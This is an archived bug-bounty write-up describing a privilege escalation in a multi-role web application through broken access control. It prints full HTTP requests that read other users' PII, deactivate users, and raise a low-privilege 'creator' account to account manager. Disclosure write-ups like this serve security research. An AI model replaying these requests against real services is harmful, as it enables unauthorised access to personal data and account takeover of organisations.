# Broken access control + misconfiguration = Beautiful privilege escalation

- **Source URL:** https://medium.com/@Hossam.Mesbah/broken-access-control-misconfiguration-beautiful-privilege-escalation-e4fdfd018efa?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20221128200621/https://medium.com/@Hossam.Mesbah/broken-access-control-misconfiguration-beautiful-privilege-escalation-e4fdfd018efa
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/924 (id 924)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Broken access control + misconfiguration = Beautiful privilege escalation

Hello His/Her

This story will be about the Privilege escalation vulnerability I found lately

- There are 2 roles on this site creator/account owner
- account owner user is the management and is able to access the full account users and other functions
- The creator role is only able to create some things in the organization but he can’t access anything such as user information, UUID’s , and other organization information/PII

- I tried most endpoints to find broken access control but the most of them 403 was forbidden only one endpoint allowed me to read the users information/PII

**This endpoint allows the unauthorized user to access the organization informations/PII**

GET /v1/account/customer/users?includeDetails=true HTTP/1.1 Host: dontlookhere Cookie: FewRoleUserCookies User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0 Accept: application/json, text/plain, \*/\* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: [https://](https://app.constantcontact.com/pages/myaccount/settings/users)dontlookhere Dnt: 1 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close


- The broken access control above I found endpoint allowed me to access the organization user’s informations such as Email, Phone number, UUID, Address and other

The above is a vulnerability but I still need to get Privilege escalation

- Also, the most of the functions are return forbidden 403 the add user, delete user, and other write functions return 403
- Only one function was executed and returned 200 on a Few user role account
- So I tried this request

PUT /v1/myaccountapi/account/customers/users/UUID-bd796c52dca7/status HTTP/1.1 Host: dontlookhere Cookie: FewUserCookies User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0 Accept: application/json, text/plain, \*/\* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: [https://](https://app.constantcontact.com/pages/myaccount/settings/users)dontlookhere Content-Type: application/json;charset=utf-8 X-Csrf-Token: X-Xsrf-Token: Content-Length: 69 Origin: [https://d](https://app.constantcontact.com)ontlookhere Dnt: 1 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close {“status”:”DISABLED”,”userId”:”UUID–886f-bd796c52dca7"}


- In the above request I found I was able to change the users status to deactivate without 403 and the user changed to deactivated status and can reactivate it
- But the second here I was able to upgrade my role from creator to Account manager using the change role function

PUT /v1/myaccountapi/billing/customers/users/UUID-553486df4683/roles HTTP/2

Host: dontlookhere

Cookie: FewUserCookies

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0

Accept: application/json, text/plain, \*/\*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: [https://dontlookhere](https://dontlookhere)

Content-Type: application/json;charset=utf-8

X-Csrf-Token: 

Content-Length: 3

Origin: [https://dontlookhere](https://dontlookhere)

Dnt: 1

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Te: trailers

\[1\]


Role \[2\] is the creator and role \[1\] is the account manager

So I replaced the cookies to the Creator role account cookies and changed the UUID to the same creator role account UUID I get it from the broken access control above and also I was able to edit any other users’ roles due to I was able to retrieve there UUID’s

- The request executed by the Few users and what?
- And that’s great the account role has been changed to account manager and now I’m the Admin of the organization :)

- So the functions I can escalate to are:

Activate/Deactivate users

Access user’s PII/Information

Change my roles/ and users’ roles and get an account owner role

Thanks for reading hope you have wonderful days until we meet again

Socials:

Linkedin.com/in/m359ah

Twitter.com/m359ah
